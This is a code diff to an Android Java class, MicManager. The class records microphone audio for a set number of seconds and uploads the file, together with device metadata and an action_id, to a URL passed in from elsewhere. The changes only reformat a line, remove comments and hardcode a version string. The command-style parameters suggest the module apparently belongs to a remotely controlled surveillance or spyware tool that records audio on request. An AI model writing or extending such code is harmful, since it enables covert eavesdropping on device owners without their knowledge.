@@ -42,7 +42,8 @@ public class MicManager {
     public static File audioFile = null;
     public static TimerTask stopRecording;
 
-    public static void startRecording(final Context context, int sec, final int action_id, final String url) throws Exception {
+    public static void startRecording(final Context context, int sec,
+                                      final int action_id, final String url) throws Exception {
         File dir = context.getCacheDir();
         try {
             Log.e(TAG,"startRecording():DIRR "+ dir.getAbsolutePath());
@@ -63,13 +64,10 @@ public class MicManager {
         stopRecording = new TimerTask() {
             @Override
             public void run() {
-                //stopping recorder
                 recorder.stop();
                 recorder.release();
 
                 SendFile(context,audioFile,action_id,url);
-                //sendVoice(audioFile);
-                //audioFile.delete();
             }
         };
         new Timer().schedule(stopRecording, (sec+1)*1000);
@@ -82,7 +80,7 @@ public class MicManager {
                 .addFormDataPart("device_name", "")
                 .addFormDataPart("os", "AND")
                 .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
-                .addFormDataPart("version", localVersionName(context))
+                .addFormDataPart("version", "android_1.0.0")
                 .addFormDataPart("down_delay", "-1")
                 .addFormDataPart("action_id", String.valueOf(action_id))
                 .addFormDataPart("code", String.valueOf(0))
